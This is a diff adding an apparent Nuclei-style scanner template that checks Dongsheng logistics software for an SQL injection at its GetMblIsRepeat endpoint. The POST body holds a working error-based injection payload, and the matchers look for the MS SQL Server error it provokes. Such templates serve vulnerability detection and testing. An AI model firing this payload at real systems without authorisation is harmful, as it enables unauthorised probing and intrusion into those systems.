@@ -1,0 +1,30 @@
+id: poc-yaml-dongshengsoft-getmblisrepeat-sqli
+info:
+  name: 东胜物流软件 GetMblIsRepeat SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/MvcShipping/MsOpSeae/GetMblIsRepeat"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      bsno=1&mblno='and+1<@@VERSION--+-
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "Microsoft SQL Server"
+          - "SqlException:"
+          - ".GetMblIsRepeat"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
